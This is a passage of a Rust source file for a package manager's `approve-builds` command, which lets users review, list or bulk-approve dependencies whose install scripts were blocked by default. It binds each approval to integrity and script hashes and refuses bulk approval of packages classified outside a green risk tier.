//! `lpm approve-builds` — review and approve packages whose install scripts
//! were blocked by the post-Phase-4 default-deny security posture.
//!
//! ## Phase 32 Phase 4 M4
//!
//! This command pairs with the post-install warning emitted by `lpm install`
//! when packages with lifecycle scripts are not yet covered by an existing
//! strict approval. It reads the install-time blocked set from
//! `<project_dir>/.lpm/build-state.json` (written by M3) and lets the user
//! approve them via:
//!
//! - **Interactive TUI** (`lpm approve-builds`) — walk the blocked set one
//!   at a time, with `Approve / Skip / View full script / Quit` per package
//! - **Bulk approve** (`--yes`) — approve everything blocked, with a loud
//!   warning banner; the escape hatch for CI / "I trust this manifest"
//! - **Direct approve** (`<pkg>`) — approve a single package by name
//! - **Read-only listing** (`--list`) — print the blocked set, NO mutations
//!
//! All approvals are bound to `{name, version, integrity, script_hash}`
//! per the Phase 4 trust binding contract (see [`lpm_workspace::TrustedDependencies`]).
//!
//! ## Output
//!
//! In `--json` mode the command emits a stable, versioned schema (see
//! [`SCHEMA_VERSION`]). The same schema is used for `--list --json` and
//! `--yes --json` so agents can drive the flow uniformly.

use crate::build_state::{self, BlockedPackage, BuildState};
use crate::output;
use lpm_common::LpmError;
use lpm_workspace::{ApprovalMetadata, TrustMatch, TrustedDependencies};
use owo_colors::OwoColorize;
use std::path::{Path, PathBuf};

/// **Phase 46 P7.** Project the install-time-captured fields off a
/// [`BlockedPackage`] into the [`ApprovalMetadata`] bundle that
/// [`TrustedDependencies::approve_with_metadata`] persists.
///
/// Centralized so each future approval-time field addition only edits
/// one site instead of every `--yes` / direct / interactive call.
/// Closes the P7 round-trip: `BlockedPackage.behavioral_tags{,_hash}` and
/// `BlockedPackage.provenance_at_capture` flow into the binding's
/// `behavioral_tags{,_hash}` and `provenance_at_approval` respectively.
fn approval_metadata_from_blocked(blocked: &BlockedPackage) -> ApprovalMetadata {
    ApprovalMetadata {
        integrity: blocked.integrity.clone(),
        script_hash: blocked.script_hash.clone(),
        provenance_at_approval: blocked.provenance_at_capture.clone(),
        behavioral_tags_hash: blocked.behavioral_tags_hash.clone(),
        behavioral_tags: blocked.behavioral_tags.clone(),
    }
}

/// Stable schema version for the `--json` output. Bump on any breaking
/// change to the JSON shape so agents can branch on it.
///
/// Version history:
/// - **v1** (Phase 32 Phase 4): initial schema — blocked entries carry
///   `name`, `version`, `integrity`, `script_hash`, `phases_present`,
///   `binding_drift`.
/// - **v2** (Phase 46 P2, Chunk 3): adds `static_tier` on each
///   blocked entry. Value is one of `"green" | "amber" | "amber-llm"
///   | "red"` when classification ran, or `null` when the persisted
///   state predates P2 (readers should tolerate `null` to stay
///   forward-compatible with v1 state that predates a re-install).
/// - **v3** (Phase 46 P7, Chunk 4): adds `version_diff` on each
///   blocked entry. `null` when no prior approved binding exists for
///   this package name (first-time review); otherwise the structured
///   object documented on
///   [`crate::version_diff::version_diff_to_json`] — includes
///   `reason: "no-change"` for "we found the prior but no dimension
///   drifted" so agents can distinguish that from "no prior to
///   compare." Pre-v3 readers ignore the new field; v3+ readers
///   branch on `schema_version >= 3` to know when to expect it.
pub const SCHEMA_VERSION: u32 = 3;

/// Filter the persisted build-state's blocked set against the current
/// `trustedDependencies` and return only the entries that are STILL
/// blocked.
///
/// **Phase 4 audit fix (D-impl-2, 2026-04-11):** the persisted
/// `build-state.json` is only refreshed by `lpm install`. Without this
/// filter step, `lpm approve-builds` would re-render or re-approve
/// packages the user has already approved (until the next install
/// re-captures the state). The audit reproduced this end-to-end:
/// install esbuild → approve-builds --yes → approve-builds --list --json
/// still returned esbuild as blocked.
///
/// The filter rule mirrors the install-time blocked-set computation in
/// [`build_state::compute_blocked_packages`]:
///
/// - [`TrustMatch::Strict`] / [`TrustMatch::LegacyNameOnly`] → REMOVE
///   from the effective blocked set (the script will run when `lpm build`
///   eventually executes; the user has nothing to review).
/// - [`TrustMatch::BindingDrift`] → KEEP. Drift is the whole reason we
///   re-review. The blocked package's existing `binding_drift` flag is
///   already true in this case (set by the install-time capture), so the
///   downstream rendering doesn't need to know whether the drift came
///   from the persisted state or from a fresh check.
/// - [`TrustMatch::NotTrusted`] → KEEP. The default-deny case.
pub fn compute_effective_blocked_set<'a>(
    state: &'a BuildState,
    trusted: &TrustedDependencies,
) -> Vec<&'a BlockedPackage> {
    state
        .blocked_packages
        .iter()
        .filter(|bp| {
            let trust = trusted.matches_strict(
                &bp.name,
                &bp.version,
                bp.integrity.as_deref(),
                bp.script_hash.as_deref(),
            );
            !matches!(trust, TrustMatch::Strict | TrustMatch::LegacyNameOnly)
        })
        .collect()
}

/// Run the `lpm approve-builds` command.
///
/// `package`: Some(name) or Some("name@version") to approve a specific
/// package directly. None to enter the interactive walk OR (with `--yes`
/// or `--list`) the corresponding non-interactive variant.
///
/// `yes`: bulk-approve every blocked package. Mutually exclusive with `list`.
///
/// `list`: read-only listing of the blocked set. Mutually exclusive with
/// `yes`. Cannot be combined with `package`.
pub async fn run(
    project_dir: &Path,
    package: Option<&str>,
    yes: bool,
    list: bool,
    json_output: bool,
) -> Result<(), LpmError> {
    // ── Argument validation ─────────────────────────────────────────
    //
    // Mutual exclusion: `--yes` and `--list` are contradictory (one mutates,
    // one is read-only). `--list` cannot take a `<pkg>` argument because the
    // listing is over the entire blocked set, not a single package. Both are
    // hard errors with actionable guidance.
    if yes && list {
        return Err(LpmError::Script(
            "`--list` is read-only and conflicts with `--yes`. \
             Pick one: `--list` to inspect, or `--yes` to approve."
                .into(),
        ));
    }
    if list && package.is_some() {
        return Err(LpmError::Script(
            "`--list` cannot take a package name argument. \
             It prints the entire blocked set in read-only mode."
                .into(),
        ));
    }

    // ── Read build-state.json ───────────────────────────────────────

    let pkg_json_path = project_dir.join("package.json");
    if !pkg_json_path.exists() {
        return Err(LpmError::NotFound(
            "lpm approve-builds requires a package.json in the current directory.".into(),
        ));
    }

    let state = match build_state::read_build_state(project_dir) {
        Some(s) => s,
        None => {
            return Err(LpmError::NotFound(
                "no build-state.json found — run `lpm install` first to capture the blocked set"
                    .into(),
            ));
        }
    };

    // ── Load current trustedDependencies (Phase 4 D-impl-2) ─────────
    //
    // Loading the manifest BEFORE the early-return on empty state is the
    // audit fix for Finding 2: the persisted state is filtered through
    // the current trust to compute the *effective* blocked set, so an
    // already-approved package doesn't appear in --list / --yes output.

    let manifest_text = std::fs::read_to_string(&pkg_json_path).map_err(LpmError::Io)?;
    let mut manifest: serde_json::Value = serde_json::from_str(&manifest_text)
        .map_err(|e| LpmError::Registry(format!("failed to parse package.json: {e}")))?;

    let mut trusted = extract_trusted_dependencies(&manifest);
    let initial_was_legacy = matches!(trusted, TrustedDependencies::Legacy(_));

    // Re-evaluate the persisted blocked set against the current trust.
    // The borrow returns &BlockedPackage; we materialize the underlying
    // owned values into a Vec<BlockedPackage> so the rest of the function
    // can move/iterate without lifetime gymnastics.
    let effective: Vec<BlockedPackage> = compute_effective_blocked_set(&state, &trusted)
        .into_iter()
        .cloned()
        .collect();

    // Construct an "effective state" view that the rest of the function
    // operates on. The captured fingerprint is unchanged (it's the
    // identity of the persisted state, not of the effective filter).
    let effective_state = BuildState {
        state_version: state.state_version,
        blocked_set_fingerprint: state.blocked_set_fingerprint.clone(),
        captured_at: state.captured_at.clone(),
        blocked_packages: effective,
    };

    // ── <pkg> argument: handled BEFORE the empty-effective short-circuit ──
    //
    // When the user explicitly names a package, we want a targeted
    // message: "already approved" if they named something that's been
    // approved, or "not in blocked set" if they named something unknown.
    // The generic "nothing to approve" success path would be confusing
    // because the user is asking about ONE package.
    //
    // Phase 4 D-impl-2: this branch must run BEFORE the empty-effective
    // check so the user-friendly errors are reachable.
    if let Some(arg) = package {
        // Track outcomes for the summary
        let mut approved: Vec<&BlockedPackage> = Vec::new();
        let skipped: Vec<&BlockedPackage> = Vec::new();

        let target = find_blocked_by_arg(&effective_state.blocked_packages, arg);
        let target = match target {
            Some(t) => t,
            None => {
                // Was the arg in the persisted (unfiltered) state? If so,
                // it must have been filtered out by current trust →
                // already approved.
                if find_blocked_by_arg(&state.blocked_packages, arg).is_some() {
                    return Err(LpmError::Script(format!(
                        "package '{arg}' is already approved (current binding matches). \
                         Run `lpm install` to refresh the blocked set, or pass `--list` to see what's still blocked."
                    )));
                }
                return Err(LpmError::NotFound(format!(
                    "package '{arg}' is not in the blocked set. Run `lpm approve-builds --list` to see what's blocked."
                )));
            }
        };

        // Confirm in TTY mode unless json_output (which always proceeds)
        let confirmed = if json_output || !is_tty() {
            true
        } else {
            print_package_card(target);
            // Phase 46 P7 Chunk 3: surface the version diff card
            // alongside the regular card when this is an UPDATE
            // (prior binding under same name exists). No-op for
            // first-time review.
            print_version_diff_card_for_blocked(target, &trusted);
            let prompt = if trusted
                .latest_binding_for_name(&target.name, &target.version)
                .is_some()
            {
                format!("Accept new {}@{}?", target.name, target.version)
            } else {
                format!("Approve {}@{}?", target.name, target.version)
            };
            cliclack::confirm(prompt)
                .interact()
                .map_err(|e| LpmError::Script(format!("prompt failed: {e}")))?
        };

        if confirmed {
            // Phase 46 P4/P7 write-path: carry install-time
            // provenance + behavioral-tag captures into the binding so
            // subsequent installs can compare against them
            // (§7.2 drift rule + §11 P7 version diff).
            trusted.approve_with_metadata(
                &target.name,
                &target.version,
                approval_metadata_from_blocked(target),
            );
            approved.push(target);
            write_back(&pkg_json_path, &mut manifest, &trusted)?;
        } else {
            // skip path: nothing to record besides the count (typed-out
            // here to avoid an unused mut warning if we never push)
            return print_summary(
                &effective_state,
                &approved,
                &[target],
                &trusted,
                initial_was_legacy,
                false,
                json_output,
            );
        }

        return print_summary(
            &effective_state,
            &approved,
            &skipped,
            &trusted,
            initial_was_legacy,
            false,
            json_output,
        );
    }

    if effective_state.blocked_packages.is_empty() {
        if json_output {
            let body = serde_json::json!({
                "schema_version": SCHEMA_VERSION,
                "command": "approve-builds",
                "blocked_count": 0,
                "approved_count": 0,
                "skipped_count": 0,
                "blocked": [],
                "warnings": [],
                "errors": [],
            });
            println!("{}", serde_json::to_string_pretty(&body).unwrap());
        } else {
            output::success(
                "Nothing to approve. All scriptable packages are already trusted (or there are none).",
            );
        }
        return Ok(());
    }

    // ── --list (read-only) ──────────────────────────────────────────

    if list {
        return print_listing(&effective_state, &trusted, json_output);
    }

    // Track outcomes for the summary / JSON output
    let mut approved: Vec<&BlockedPackage> = Vec::new();
    let mut skipped: Vec<&BlockedPackage> = Vec::new();

    // ── --yes (bulk approve) ────────────────────────────────────────

    if yes {
        // Phase 46 P2 Chunk 4 — refuse bulk approval when any
        // effective-blocked entry is classified outside the green
        // tier. Gate runs BEFORE `emit_yes_warning_banner` so we
        // don't emit success-shaped human + tracing output and then
        // abort — that sequence would corrupt log aggregators and
        // mislead the user about whether the operation ran.
        //
        // Refusal is restricted to EXPLICIT non-green tiers:
        // - Some(Amber) / Some(AmberLlm) / Some(Red) → refuse.
        // - Some(Green) → allowed in bulk (still requires explicit
        //   --yes; auto-execution is P6, gated on the P5 sandbox).
        // - None → pass-through to today's behavior. `None` means
        //   the persisted blocked state was written by a pre-P2 LPM
        //   that never classified the package; breaking those
        //   existing `--yes` flows before the next install
        //   recaptures the state would be a silent P1→P2 upgrade
        //   regression.
        enforce_tiered_yes_gate(&effective_state.blocked_packages)?;

        emit_yes_warning_banner(effective_state.blocked_packages.len(), json_output);
        for blocked in &effective_state.blocked_packages {
            // Phase 46 P4/P7 write-path — see the direct-approve
            // branch above for the rationale.
            trusted.approve_with_metadata(
                &blocked.name,
                &blocked.version,
                approval_metadata_from_blocked(blocked),
            );
            approved.push(blocked);
        }
        write_back(&pkg_json_path, &mut manifest, &trusted)?;
        return print_summary(
            &effective_state,
            &approved,
            &skipped,
            &trusted,
            initial_was_legacy,
            yes,
            json_output,
        );
    }

    // (The `<pkg>` branch is handled at the top of `run` BEFORE the
    // empty-effective short-circuit — see the Phase 4 D-impl-2 comment.)

    // ── Default: interactive walk ───────────────────────────────────

    if !is_tty() {
        return Err(LpmError::Script(
            "interactive review requires a TTY. \
             Use `--yes` to approve everything, `--list` to inspect, or pass a `<pkg>` argument."
                .into(),
        ));
    }
    if json_output {
        return Err(LpmError::Script(
            "interactive review cannot be combined with `--json`. \
             Use `--list --json`, `--yes --json`, or `<pkg> --json` for structured output."
                .into(),
        ));
    }

    // Walk one at a time. Quit aborts WITHOUT writing in-progress entries
    // (atomic). The accumulator only gets flushed to disk after the loop.
    // Phase 4 D-impl-2: walk the EFFECTIVE blocked set, not the persisted
    // state — already-approved packages are skipped.
    output::info(&format!(
        "{} package(s) blocked. Walking one at a time — Quit aborts without writing.",
        effective_state.blocked_packages.len(),
    ));
    println!();

    let mut quit_early = false;
    for blocked in &effective_state.blocked_packages {
        print_package_card(blocked);
        // Phase 46 P7 Chunk 3: render the version-diff card for
        // updates (no-op when no prior binding exists for the same
        // package name).
        print_version_diff_card_for_blocked(blocked, &trusted);

        // Phase 46 P7 Chunk 3: branch the Select on whether this is
        // a first-time review or an update. The two branches share
        // back-end semantics via `InteractiveChoice::decision()`;
        // the difference is the labels users see — `Approve` /
        // `Skip` vs. `Accept new` / `Keep old (skip)`. The latter
        // names the implicit retention so users don't fear that
        // declining will mutate their prior approval. Per signoff
        // B(i), `KeepOld` does NOT rewrite a resolver pin or
        // downgrade — it just declines the candidate.
        let is_update = trusted
            .latest_binding_for_name(&blocked.name, &blocked.version)
            .is_some();

        // The View option re-prints the full script and re-prompts. To
        // re-prompt without cloning the (non-Clone) cliclack Select, we
        // build a fresh Select on each iteration.
        let mut decision: Option<bool> = None;
        loop {
            let prompt = format!(
                "What would you like to do with {}@{}?",
                blocked.name, blocked.version
            );
            let choice = if is_update {
                // Default to KeepOld: when the diff card is sitting
                // RIGHT ABOVE this prompt showing what changed, the
                // safe-by-default choice is to decline the change.
                // The user can tab to AcceptNew with one keystroke.
                cliclack::select(prompt)
                    .item(
                        InteractiveChoice::AcceptNew,
                        "Accept new",
                        "approve this candidate version",
                    )
                    .item(
                        InteractiveChoice::KeepOld,
                        "Keep old",
                        "skip; prior approval untouched",
                    )
                    .item(InteractiveChoice::View, "View full script", "")
                    .item(InteractiveChoice::Quit, "Quit", "abort without writing")
                    .initial_value(InteractiveChoice::KeepOld)
                    .interact()
                    .map_err(|e| LpmError::Script(format!("prompt failed: {e}")))?
            } else {
                // First-time review: original Phase 4 labels.
                cliclack::select(prompt)
                    .item(InteractiveChoice::Approve, "Approve", "")
                    .item(InteractiveChoice::Skip, "Skip", "")
                    .item(InteractiveChoice::View, "View full script", "")
                    .item(InteractiveChoice::Quit, "Quit", "abort without writing")
                    .initial_value(InteractiveChoice::Approve)
                    .interact()
                    .map_err(|e| LpmError::Script(format!("prompt failed: {e}")))?
            };
            match choice.decision() {
                Some(d) => {
                    decision = Some(d);
                    break;
                }
                None => match choice {
                    InteractiveChoice::View => {
                        print_full_script(project_dir, blocked);
                        // Loop back: rebuild Select and re-prompt
                        continue;
                    }
                    InteractiveChoice::Quit => {
                        quit_early = true;
                        break;
                    }
                    _ => unreachable!("decision() returns None only for View / Quit"),
                },
            }
        }

        if quit_early {
            break;
        }

        match decision {
            Some(true) => approved.push(blocked),
            Some(false) => skipped.push(blocked),
            None => unreachable!("inner loop only exits with a decision or quit_early"),
        }
        println!();
    }

    if quit_early {
        // Aborted: do NOT write any in-progress entries.
        if approved.is_empty() {
            output::warn("Quit before approving anything. package.json is unchanged.");
        } else {
            output::warn(&format!(
                "Quit after {} approval(s). DISCARDED — package.json is unchanged.",
                approved.len()
            ));
        }
        return Ok(());
    }

    // Apply approvals (atomic single write)
    for blocked in &approved {
        // Phase 46 P4/P7 write-path — see the direct-approve branch
        // earlier for the rationale.
        trusted.approve_with_metadata(
            &blocked.name,
            &blocked.version,
            approval_metadata_from_blocked(blocked),
        );
    }
    if !approved.is_empty() {
        write_back(&pkg_json_path, &mut manifest, &trusted)?;
    }

    print_summary(
        &effective_state,
        &approved,
        &skipped,
        &trusted,
        initial_was_legacy,
        false,
        json_output,
    )
}

/// **Phase 46 P7 Chunk 3.** The interactive walk's per-package
/// choice space.
///
/// `Approve` and `Skip` are the original Phase 4 actions used when
/// no prior approval exists for a different version of the same
/// package. P7 adds [`AcceptNew`] and [`KeepOld`] — the same two
/// actions wearing labels that name the *update* the user is
/// reviewing, used when [`TrustedDependencies::latest_binding_for_name`]
/// returns a prior binding. Both pairs collapse to the same
/// approve / decline back-end semantics; the only difference is
/// the label clarity. `KeepOld` does **NOT** rewrite the resolver
/// pin or downgrade the package — per signoff B(i), it just means
/// "do not approve this candidate; the prior binding for the older
/// version stays untouched in `package.json`."
///
/// View / Quit are unconditional.
///
/// [`TrustedDependencies::latest_binding_for_name`]: lpm_workspace::TrustedDependencies::latest_binding_for_name
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum InteractiveChoice {
    /// First-time review: write a binding for `name@version`.
    Approve,
    /// First-time review: defer; nothing written.
    Skip,
    /// Update review: same as `Approve` but the label names the
    /// candidate ("accept the new version's binding"). Selected
    /// when a prior binding exists.
    AcceptNew,
    /// Update review: same as `Skip` but the label names the
    /// implicit retention ("keep the prior approval; don't trust
    /// this candidate"). Selected when a prior binding exists.
    KeepOld,
    /// Re-print the full install-phase scripts and re-prompt.
    View,
    /// Abort the walk without writing anything.
    Quit,
}

impl InteractiveChoice {
    /// Decision projection: collapse the four
    /// approve/decline-shaped variants onto the back-end action.
    /// `Some(true)` → write binding; `Some(false)` → decline (no
    /// write); `None` → not a decision (View / Quit).
    fn decision(self) -> Option<bool> {
        match self {
            InteractiveChoice::Approve | InteractiveChoice::AcceptNew => Some(true),
            InteractiveChoice::Skip | InteractiveChoice::KeepOld => Some(false),
            InteractiveChoice::View | InteractiveChoice::Quit => None,
        }
    }
}

/// **Phase 46 P7 Chunk 3.** Print the version-diff card for a
/// blocked entry — the fuller "changes since v<prior>" view that
/// renders alongside the package's existing card during the
/// interactive walk, the direct `<pkg>` approve, and the `--list`
/// listing.
///
/// No-op when (a) no prior approved binding exists for this
/// package name (first-time review — nothing to diff against), or
/// (b) the diff classifies as
/// [`crate::version_diff::VersionDiffReason::NoChange`].
///
/// Reads store bodies for both prior and candidate via
/// [`crate::build_state::read_install_phase_bodies`]; degrades
/// gracefully when the prior version is no longer in the store
/// (cache cleaned, fresh clone evicted the prior tarball) — the
/// renderer prints its "(prior or candidate scripts not in store)"
/// fallback rather than emitting a misleading empty diff.
///
/// Emits to stdout (cliclack TUI is stdout-driven; `--json` mode
/// can never reach this path because the interactive walk refuses
/// to combine with `--json` upstream).
fn print_version_diff_card_for_blocked(blocked: &BlockedPackage, trusted: &TrustedDependencies) {
    let Some((prior_version, binding)) =
        trusted.latest_binding_for_name(&blocked.name, &blocked.version)
    else {
        return;
    };
    let diff = crate::version_diff::compute_version_diff(prior_version, binding, blocked);
    if !diff.is_drift() {
        return;
    }
    let store = match lpm_store::PackageStore::default_location() {
        Ok(s) => s,
        Err(_) => {
            // Store unavailable — still render the structured part of
            // the card (header, tag delta, provenance) but the
            // script-body section will degrade. Pass None for both
            // sides; the renderer's fallback note is appropriate.
            if let Some(card) =
                crate::version_diff::render_preflight_card(&diff, &blocked.name, None, None)
            {
                println!();
                println!("{card}");
                println!();
            }
            return;
        }
    };
    let prior_pairs = crate::build_state::read_install_phase_bodies(
        &store.package_dir(&blocked.name, prior_version),
    );
    let candidate_pairs = crate::build_state::read_install_phase_bodies(
        &store.package_dir(&blocked.name, &blocked.version),
    );
    let prior_bodies = if prior_pairs.is_empty() {
        None
    } else {
        Some(crate::version_diff::phase_bodies_from_pairs(prior_pairs))
    };
    let candidate_bodies = if candidate_pairs.is_empty() {
        None
    } else {
        Some(crate::version_diff::phase_bodies_from_pairs(
            candidate_pairs,
        ))
    };
    if let Some(card) = crate::version_diff::render_preflight_card(
        &diff,
        &blocked.name,
        prior_bodies.as_ref(),
        candidate_bodies.as_ref(),
    ) {
        println!();
        println!("{card}");
        println!();
    }
}

/// Find a blocked package matching either `name` or `name@version`.
/// Used by the `<pkg>` argument path.
fn find_blocked_by_arg<'a>(blocked: &'a [BlockedPackage], arg: &str) -> Option<&'a BlockedPackage> {
    // Case 1: name@version (exact match)
    // Case 2: bare name (returns the FIRST entry with that name)
    //
    // For scoped packages like `@scope/pkg@1.0.0`, the LAST `@` is the
    // separator (the leading `@` is part of the scope).
    if let Some(at) = arg.rfind('@') {
        // arg COULD be `name@version` OR a scoped name `@scope/pkg`.
        // Distinguish: if the `@` is at position 0, it's the scope marker.
        if at > 0 {
            let (name, version) = (&arg[..at], &arg[at + 1..]);
            return blocked
                .iter()
                .find(|b| b.name == name && b.version == version);
        }
    }
    // Bare name lookup
    blocked.iter().find(|b| b.name == arg)
}

/// Extract `lpm.trustedDependencies` from a parsed manifest into a typed
/// [`TrustedDependencies`] enum. Returns the default (empty Legacy) if the
/// field is missing or fails to parse.
fn extract_trusted_dependencies(manifest: &serde_json::Value) -> TrustedDependencies {
    let Some(td_value) = manifest
        .get("lpm")
        .and_then(|l| l.get("trustedDependencies"))
    else {
        return TrustedDependencies::default();
    };
    serde_json::from_value(td_value.clone()).unwrap_or_default()
}

/// Write the updated `trustedDependencies` back to `package.json`.
///
/// Atomic via temp-file rename. Preserves the rest of the manifest
/// untouched (we mutate only the `lpm.trustedDependencies` subtree).
fn write_back(
    pkg_json_path: &Path,
    manifest: &mut serde_json::Value,
    trusted: &TrustedDependencies,
) -> Result<(), LpmError> {
    // Ensure `lpm` exists as a JSON object
    if manifest.get("lpm").is_none() {
        manifest["lpm"] = serde_json::json!({});
    }
    if !manifest["lpm"].is_object() {
        return Err(LpmError::Registry(
            "package.json `lpm` field is not a JSON object — refusing to write".into(),
        ));
    }

    let td_value = serde_json::to_value(trusted)
        .map_err(|e| LpmError::Registry(format!("failed to serialize trustedDependencies: {e}")))?;
    manifest["lpm"]["trustedDependencies"] = td_value;

    let updated = serde_json::to_string_pretty(manifest)
        .map_err(|e| LpmError::Registry(format!("failed to serialize package.json: {e}")))?;

    // Atomic write: temp file + rename. Mirrors build_state::write_build_state.
    let parent = pkg_json_path.parent().unwrap_or(Path::new("."));
    let pid = std::process::id();
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let tmp = parent.join(format!(".package.json.{pid}.{nanos}.tmp"));
    std::fs::write(&tmp, format!("{updated}\n")).map_err(LpmError::Io)?;
    std::fs::rename(&tmp, pkg_json_path).map_err(|e| {
        let _ = std::fs::remove_file(&tmp);
        LpmError::Io(std::io::Error::new(
            e.kind(),
            format!("failed to rename package.json tempfile into place: {e}"),
        ))
    })?;

    Ok(())
}

fn is_tty() -> bool {
    use std::io::IsTerminal;
    std::io::stdin().is_terminal() && std::io::stdout().is_terminal()
}

fn emit_yes_warning_banner(count: usize, json_output: bool) {
    let msg = format!(
        "--yes blanket-approves {count} package(s) without per-package review. \
         Approvals are bound to script hashes captured at install time. \
         This bypasses LPM's default-deny security posture."
    );
    // Triple-emission per Phase 4 status doc §"Security requirements":
    // human stdout (only in non-JSON mode), JSON warning field (set by
    // print_summary), and tracing log so any log aggregator catches the
    // bypass.
    //
    // **Phase 4 audit fix (D-impl-3, 2026-04-11):** the tracing emission
    // is safe in JSON mode because the global tracing subscriber in
    // `main.rs` is pinned to stderr — see the matching audit comment
    // there. Pre-fix the subscriber wrote to stdout and corrupted the
    // JSON payload. The relevant invariant: stdout is reserved for
    // command output (human or JSON); tracing always goes to stderr.
    tracing::warn!("{}", msg);
    if !json_output {
        println!();
        output::warn(&msg);
        println!();
    }
}

fn print_package_card(blocked: &BlockedPackage) {
    println!();
    println!("  {}@{}", blocked.name.bold(), blocked.version.dimmed(),);
    if let Some(integrity) = &blocked.integrity {
        println!(
            "    {:<14}{}",
            "Integrity:".dimmed(),
            truncate_for_display(integrity, 60),
        );
    }
    if let Some(script_hash) = &blocked.script_hash {
        println!(
            "    {:<14}{}",
            "Script hash:".dimmed(),
            truncate_for_display(script_hash, 60),
        );
    }
    if !blocked.phases_present.is_empty() {
        println!(
            "    {:<14}{}",
            "Phases:".dimmed(),
            blocked.phases_present.join(", "),
        );
    }
    // Phase 46 P2 Chunk 3 — static-gate tier annotation for the
    // interactive card. Absent (None) means the blocked-state row
    // predates P2; don't print a line rather than showing a
    // misleading "unknown".
    if let Some(tier) = blocked.static_tier {
        println!(
            "    {:<14}{}",
            "Static tier:".dimmed(),
            colored_tier_label(tier),
        );
    }
    if blocked.binding_drift {
        println!(
            "    {} {}",
            "⚠".yellow(),
            "previously approved — script content has changed since approval".yellow()
        );
    }
    println!();
}

/// Phase 46 P2 Chunk 4 — enforce the `--yes` refusal contract.
///
/// Given the **effective** blocked-set that `--yes` would approve,
/// return `Err` if any entry carries an explicit non-green static
/// tier (`Amber`, `AmberLlm`, `Red`). `Green` and `None` pass through;
/// see the gate-site comment at the callsite for the `None`-means-
/// pre-P2-state pass-through rationale.
///
/// Pure so it's unit-testable without an end-to-end `run()`
/// invocation. The callsite threads the returned `LpmError` up and
/// the JSON-error wrapper in `main.rs` turns it into structured
/// output when `--json` is set.
fn enforce_tiered_yes_gate(blocked: &[BlockedPackage]) -> Result<(), LpmError> {
    use lpm_security::triage::StaticTier;

    let refusals: Vec<&BlockedPackage> = blocked
        .iter()
        .filter(|bp| {
            matches!(
                bp.static_tier,
                Some(StaticTier::Amber | StaticTier::AmberLlm | StaticTier::Red)
            )
        })
        .collect();

    if refusals.is_empty() {
        return Ok(());
    }

    // Actionable error shape: count → per-package lines with tier
    // label → clear redirect to the interactive / single-pkg path.
    // Agents parsing the error_code=script error can substring-match
    // the `"--yes refuses"` prefix, which is stable P2-onward.
    let detail = refusals
        .iter()
        .map(|bp| {
            let tier_text = bp
                .static_tier
                .map(tier_label_text)
                .unwrap_or("unknown tier");
            format!("    {}@{}  [{}]", bp.name, bp.version, tier_text)
        })
        .collect::<Vec<_>>()
        .join("\n");

    Err(LpmError::Script(format!(
        "--yes refuses to bulk-approve {} package(s) classified outside the \
         green tier. Each requires explicit per-package review.\n\n{}\n\n\
         Run `lpm approve-builds` (interactive walk) or \
         `lpm approve-builds <pkg>` to review individual packages. \
         Use `lpm approve-builds --list` to inspect the full blocked set first.",
        refusals.len(),
        detail,
    )))
}

/// Plain text label for a [`StaticTier`] value — consumed by
/// [`colored_tier_label`] and by tests that don't want to assert
/// on ANSI escape sequences.
fn tier_label_text(tier: lpm_security::triage::StaticTier) -> &'static str {
    use lpm_security::triage::StaticTier;
    match tier {
        StaticTier::Green => "green ✓",
        StaticTier::Amber => "amber — review required",
        StaticTier::AmberLlm => "amber (llm-advised) — review required",
        StaticTier::Red => "red ✖ — hand-curated blocklist hit",
    }
}

/// Colored rendering of the tier label. Green → green, Red → red,
/// the ambers → yellow. Kept thin so the color policy lives in one
/// place and the plain-text helper stays unit-testable.
fn colored_tier_label(tier: lpm_security::triage::StaticTier) -> String {
    use lpm_security::triage::StaticTier;
    let text = tier_label_text(tier);
    match tier {
        StaticTier::Green => text.green().to_string(),
        StaticTier::Amber | StaticTier::AmberLlm => text.yellow().to_string(),
        StaticTier::Red => text.red().to_string(),
    }
}

fn truncate_for_display(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        format!("{}…", &s[..max])
    }
}

/// Read the package's `package.json` from the GLOBAL STORE and print every
/// non-empty install phase body. Used by the "View full script" choice in
/// the interactive walk. Read from the store (not from `node_modules`) to
/// match what the build pipeline executes — same source-of-truth as the
/// script-hash function.
fn print_full_script(_project_dir: &Path, blocked: &BlockedPackage) {
    let store = match lpm_store::PackageStore::default_location() {
        Ok(s) => s,
        Err(e) => {
            output::warn(&format!("could not open store: {e}"));
            return;
        }
    };
    let pkg_dir = store.package_dir(&blocked.name, &blocked.version);
    let pkg_json_path = pkg_dir.join("package.json");
    let content = match std::fs::read_to_string(&pkg_json_path) {
        Ok(c) => c,
        Err(e) => {
            output::warn(&format!(
                "could not read package.json from store at {}: {e}",
                pkg_json_path.display()
            ));
            return;
        }
    };
    let parsed: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(e) => {
            output::warn(&format!("could not parse package.json: {e}"));
            return;
        }
    };
    let scripts = parsed.get("scripts").and_then(|v| v.as_object());

    println!();
    println!("  ── Full install scripts ──");
    for phase in lpm_security::EXECUTED_INSTALL_PHASES {
        let body = scripts
            .and_then(|s| s.get(*phase))
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty());
        match body {
            Some(b) => {
                println!("  {}: {}", phase.bold(), b);
            }
            None => {
                println!("  {}: {}", phase.dimmed(), "(none)".dimmed());
            }
        }
    }
    println!();
}

fn print_listing(
    state: &BuildState,
    trusted: &TrustedDependencies,
    json_output: bool,
) -> Result<(), LpmError> {
    if json_output {
        let body = serde_json::json!({
            "schema_version": SCHEMA_VERSION,
            "command": "approve-builds",
            "mode": "list",
            "blocked_count": state.blocked_packages.len(),
            "approved_count": 0,
            "skipped_count": 0,
            "blocked": state.blocked_packages.iter().map(|b| blocked_to_json(b, trusted)).collect::<Vec<_>>(),
            "warnings": [],
            "errors": [],
        });
        println!("{}", serde_json::to_string_pretty(&body).unwrap());
        return Ok(());
    }

    output::info(&format!(
        "{} package(s) blocked:",
        state.blocked_packages.len()
    ));
    for blocked in &state.blocked_packages {
        print_package_card(blocked);
        // Phase 46 P7 Chunk 3: surface the version diff card
        // alongside each entry's regular card. No-op for entries
        // without a prior binding under the same name (first-time
        // review — nothing to diff against).
        print_version_diff_card_for_blocked(blocked, trusted);
    }
    println!();
    output::info(
        "Run `lpm approve-builds` (interactive), `lpm approve-builds --yes` (bulk), or `lpm approve-builds <pkg>` to approve.",
    );
    Ok(())
}

/// **Phase 46 P7 Chunk 4 thin wrapper.** Delegates to the shared
